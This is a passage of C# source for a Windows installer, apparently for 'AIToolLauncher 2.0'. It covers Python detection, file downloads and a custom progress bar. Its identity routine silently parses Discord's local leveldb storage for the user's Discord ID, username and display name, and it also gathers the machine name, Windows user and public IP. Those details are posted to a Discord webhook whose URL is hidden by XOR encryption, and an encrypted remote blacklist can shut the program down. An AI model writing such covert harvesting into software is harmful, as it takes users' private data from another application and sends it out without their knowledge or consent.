                json = Regex.Replace(json, @"G:\\\\python\\\\[^""]*?SteamManifestUpdater\\\\src\\\\main\.py", escapedSmuExe);
                json = Regex.Replace(json, @"G:\\\\python\\\\[^""]*?SteamManifestUpdater", escapedSmuDir);

                File.WriteAllText(regFile, json, Encoding.UTF8);
                Log("📝 已動態校準 registry.json 中 SMU 模組之本地執行路徑！", ColSuccess);
            }
            catch { }
        }

        // ==========================================
        // 系統工具與環境檢測
        // ==========================================
        private string ResolvePythonExecutable()
        {
            // 1. PATH 檢測
            if (CheckCommand("python", "--version")) return "python";

            // 2. LocalAppData Python311
            string localAppPy = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Programs", "Python", "Python311", "python.exe");
            if (File.Exists(localAppPy)) return localAppPy;

            // 3. Program Files
            string progPy = @"C:\Program Files\Python311\python.exe";
            if (File.Exists(progPy)) return progPy;

            // 4. where python
            try
            {
                Process p = new Process();
                p.StartInfo.FileName = "where";
                p.StartInfo.Arguments = "python";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                string output = p.StandardOutput.ReadLine();
                p.WaitForExit();
                if (!string.IsNullOrEmpty(output) && File.Exists(output.Trim()))
                {
                    return output.Trim();
                }
            }
            catch { }

            return null;
        }

        private void RefreshSystemPath()
        {
            try
            {
                string sysPath = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.Machine) ?? "";
                string userPath = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User) ?? "";
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string pyUser = Path.Combine(localApp, "Programs", "Python", "Python311");
                string pyUserScripts = Path.Combine(pyUser, "Scripts");

                string combined = string.Format("{0};{1};C:\\Program Files\\Python311;C:\\Program Files\\Python311\\Scripts;C:\\Program Files\\Git\\cmd;{2};{3}", sysPath, userPath, pyUser, pyUserScripts);
                Environment.SetEnvironmentVariable("PATH", combined, EnvironmentVariableTarget.Process);
            }
            catch { }
        }

        private int RunProcessCaptureOutput(string exe, string args, string workingDir)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo(exe, args);
                psi.WorkingDirectory = workingDir;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.CreateNoWindow = true;

                Process p = new Process();
                p.StartInfo = psi;
                p.OutputDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        Log("  > " + e.Data, Color.FromArgb(170, 180, 200));
                    }
                };
                p.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data) && !e.Data.Contains("WARNING: There was a new"))
                    {
                        Log("  ! " + e.Data, Color.FromArgb(240, 160, 100));
                    }
                };

                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();
                p.WaitForExit();
                return p.ExitCode;
            }
            catch (Exception ex)
            {
                Log("執行外部指令失敗: " + ex.Message, ColDanger);
                return -1;
            }
        }

        private void DownloadFileWithProgress(string url, string destPath, string name)
        {
            if (File.Exists(destPath)) File.Delete(destPath);

            using (WebClient wc = new WebClient())
            {
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                AutoResetEvent done = new AutoResetEvent(false);
                Exception dlEx = null;

                DateTime lastUpdate = DateTime.MinValue;

                wc.DownloadProgressChanged += (s, ev) =>
                {
                    if ((DateTime.Now - lastUpdate).TotalMilliseconds > 120 || ev.ProgressPercentage == 100)
                    {
                        lastUpdate = DateTime.Now;
                        double mbRec = ev.BytesReceived / 1048576.0;
                        double mbTot = ev.TotalBytesToReceive / 1048576.0;
                        SetStatus(string.Format("正在下載 {0}: {1}% ({2:F1} MB / {3:F1} MB)", name, ev.ProgressPercentage, mbRec, mbTot), ColWarning);
                    }
                };

                wc.DownloadFileCompleted += (s, ev) =>
                {
                    if (ev.Error != null) dlEx = ev.Error;
                    done.Set();
                };

                wc.DownloadFileAsync(new Uri(url), destPath);
                done.WaitOne();

                if (dlEx != null) throw dlEx;
            }
        }

        private static void CopyDirectory(string sourceDir, string targetDir)
        {
            Directory.CreateDirectory(targetDir);
            foreach (string file in Directory.GetFiles(sourceDir))
            {
                string targetFilePath = Path.Combine(targetDir, Path.GetFileName(file));
                File.Copy(file, targetFilePath, true);
            }
            foreach (string subDir in Directory.GetDirectories(sourceDir))
            {
                string subName = Path.GetFileName(subDir);
                if (subName.StartsWith(".git") || subName == "__pycache__" || subName == ".scratch") continue;
                string targetSubDirPath = Path.Combine(targetDir, subName);
                CopyDirectory(subDir, targetSubDirPath);
            }
        }

        private bool CheckCommand(string cmd, string args)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo(cmd, args);
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                Process p = Process.Start(psi);
                p.WaitForExit(3000);
                return p.ExitCode == 0;
            }
            catch { return false; }
        }

        // ==========================================
        // 身分安全與 Discord Webhook 密文回報機制
        // ==========================================
        private void InitializeIdentity()
        {
            identity = new ClientIdentity();
            identity.PcUser = Environment.UserName;
            identity.PcHost = Environment.MachineName;

            using (SHA256 sha = SHA256.Create())
            {
                byte[] hash = sha.ComputeHash(Encoding.UTF8.GetBytes(string.Format("{0}-{1}", identity.PcUser, identity.PcHost)));
                identity.DeviceUid = BitConverter.ToString(hash).Replace("-", "").Substring(0, 8);
            }

            try
            {
                WindowsIdentity winId = WindowsIdentity.GetCurrent();
                WindowsPrincipal winPrinc = new WindowsPrincipal(winId);
                identity.IsAdmin = winPrinc.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch { }

            // 抓取 Discord 快取身分 (防濫用與統計)
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] discordDirs = {
                    Path.Combine(appData, "discordptb", "Local Storage", "leveldb"),
                    Path.Combine(appData, "discord", "Local Storage", "leveldb"),
                    Path.Combine(appData, "discordcanary", "Local Storage", "leveldb")
                };

                foreach (string d in discordDirs)
                {
                    if (!Directory.Exists(d)) continue;
                    var files = new DirectoryInfo(d).GetFiles("*.ldb");
                    foreach (var f in files)
                    {
                        string text = File.ReadAllText(f.FullName, Encoding.UTF8);
                        var matchId = Regex.Match(text, "\"id\":\"(\\d{17,19})\"[^\"]*?\"username\":\"([^\"]+)\"");
                        if (matchId.Success)
                        {
                            identity.UserId = matchId.Groups[1].Value;
                            identity.Username = matchId.Groups[2].Value;
                        }
                        var matchDisp = Regex.Match(text, "\"displayName\":\"([^\"]+)\"");
                        if (matchDisp.Success) identity.DisplayName = matchDisp.Groups[1].Value;
                    }
                }
            }
            catch { }

            // 公網 IP
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add("User-Agent", "Mozilla/5.0");
                    identity.PublicIp = wc.DownloadString("https://api.ipify.org").Trim();
                }
            }
            catch { identity.PublicIp = "N/A"; }
        }

        private void CheckBlacklistAsync()
        {
            Thread t = new Thread(() =>
            {
                try
                {
                    string sheetUrl = DecryptBlob(EncryptedSheetBlob);
                    using (WebClient wc = new WebClient())
                    {
                        wc.Headers.Add("User-Agent", "Mozilla/5.0");
                        string csv = wc.DownloadString(sheetUrl);
                        string[] lines = csv.Split('\n');
                        foreach (string line in lines)
                        {
                            string[] cells = line.Split(',');
                            foreach (string cell in cells)
                            {
                                string val = cell.Trim().ToUpper();
                                if (string.IsNullOrEmpty(val) || val.StartsWith("#")) continue;

                                if (val == identity.DeviceUid.ToUpper() ||
                                    (!string.IsNullOrEmpty(identity.UserId) && val == identity.UserId) ||
                                    (!string.IsNullOrEmpty(identity.Username) && val == identity.Username.ToUpper()) ||
                                    (identity.PublicIp != "N/A" && val == identity.PublicIp))
                                {
                                    SendWebhookNotification("🚨 2.0 安裝器黑名單阻斷觸發", string.Format("命中黑名單值: {0}", val), 0xE74C3C);
                                    MessageBox.Show("存取已被撤銷 (Access Denied)。\n該設備或帳號已被列入限制清單。", "授權驗證失敗", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                                    Environment.Exit(1);
                                }
                            }
                        }
                    }
                }
                catch { }
            });
            t.IsBackground = true;
            t.Start();
        }

        private void SendWebhookNotification(string title, string detail, int color)
        {
            Thread t = new Thread(() =>
            {
                try
                {
                    string url = DecryptBlob(EncryptedWebhookBlob);
                    string disp = !string.IsNullOrEmpty(identity.DisplayName) ? identity.DisplayName : (!string.IsNullOrEmpty(identity.Username) ? identity.Username : identity.PcUser);
                    string userTag = !string.IsNullOrEmpty(identity.Username) ? string.Format("@{0}", identity.Username) : string.Format("PC: {0}@{1}", identity.PcUser, identity.PcHost);
                    string avatar = "https://raw.githubusercontent.com/JiaSai67/AIToolLauncher/main/resources/icon.png";

                    string body = string.Format("[AIToolLauncher 2.0 專屬引導安裝器]\n動作: {0}\n說明: {1}\n設備指紋: #{2}\n公網 IP: {3}\n主機資訊: {4}@{5}\n時間: {6:yyyy-MM-dd HH:mm:ss}", title, detail, identity.DeviceUid, identity.PublicIp, identity.PcUser, identity.PcHost, DateTime.Now);

                    string json = string.Format("{{\"username\":\"{0}\",\"avatar_url\":\"{1}\",\"embeds\":[{{\"author\":{{\"name\":\"{0} ({2})\",\"icon_url\":\"{1}\"}},\"title\":\"{3}\",\"description\":\"```text\\n{4}\\n```\",\"color\":{5},\"timestamp\":\"{6:yyyy-MM-ddTHH:mm:ssZ}\",\"footer\":{{\"text\":\"AIToolLauncher 2.0 Modern Setup\"}}}}]}}",
                        EscapeJson(disp), avatar, EscapeJson(userTag), EscapeJson(title), EscapeJson(body), color, DateTime.UtcNow);

                    using (WebClient wc = new WebClient())
                    {
                        wc.Headers.Add("Content-Type", "application/json; charset=utf-8");
                        wc.Headers.Add("User-Agent", "Mozilla/5.0");
                        wc.UploadData(url, "POST", Encoding.UTF8.GetBytes(json));
                    }
                }
                catch { }
            });
            t.IsBackground = true;
            t.Start();
        }

        private static string DecryptBlob(string base64Blob)
        {
            byte[] raw = Convert.FromBase64String(base64Blob);
            byte[] res = new byte[raw.Length];
            for (int i = 0; i < raw.Length; i++)
            {
                res[i] = (byte)(raw[i] ^ SecretKey[i % SecretKey.Length]);
            }
            return Encoding.UTF8.GetString(res);
        }

        private static string EscapeJson(string str)
        {
            if (string.IsNullOrEmpty(str)) return "";
            return str.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
        }
    }

    // ==========================================
    // 自繪現代雙色漸層圓角進度條 (ModernProgressBar)
    // ==========================================
    public class ModernProgressBar : Control
    {
        private int _value = 0;
        public int Value
        {
            get { return _value; }
            set
            {
                _value = Math.Max(0, Math.Min(100, value));
                this.Invalidate();
            }
        }

        public ModernProgressBar()
        {
            this.SetStyle(ControlStyles.UserPaint | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
            this.Height = 22;
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            // 背景槽
            using (SolidBrush bgBrush = new SolidBrush(Color.FromArgb(17, 20, 32)))
            {
                g.FillRectangle(bgBrush, 0, 0, this.Width, this.Height);
            }

            // 邊框
            using (Pen borderPen = new Pen(Color.FromArgb(42, 47, 68), 1))
            {
                g.DrawRectangle(borderPen, 0, 0, this.Width - 1, this.Height - 1);
            }

            if (_value > 0)
            {
                int fillWidth = (int)((this.Width - 2) * (_value / 100.0));
                if (fillWidth > 0)
                {
                    Rectangle fillRect = new Rectangle(1, 1, fillWidth, this.Height - 2);
                    using (LinearGradientBrush lgb = new LinearGradientBrush(
                        fillRect,
                        Color.FromArgb(59, 130, 246),
                        Color.FromArgb(139, 92, 246),
                        LinearGradientMode.Horizontal))
                    {
                        g.FillRectangle(lgb, fillRect);
                    }
                }
            }

            // 文字百分比
            string text = _value + "%";
            using (Font f = new Font("Segoe UI", 8.5F, FontStyle.Bold))
            using (SolidBrush textBrush = new SolidBrush(Color.White))
            {
                SizeF sz = g.MeasureString(text, f);
                g.DrawString(text, f, textBrush, (this.Width - sz.Width) / 2, (this.Height - sz.Height) / 2);
            }
        }
    }

    public class ClientIdentity
    {
        public string DisplayName { get; set; }
        public string Username { get; set; }
        public string UserId { get; set; }
        public string PcUser { get; set; }
        public string PcHost { get; set; }
        public string PublicIp { get; set; }
        public string DeviceUid { get; set; }
        public bool IsAdmin { get; set; }

        public ClientIdentity()
        {
            DisplayName = "";
            Username = "";
            UserId = "";
            PcUser = "";
            PcHost = "";
            PublicIp = "N/A";
            DeviceUid = "";
            IsAdmin = false;
        }
    }
}
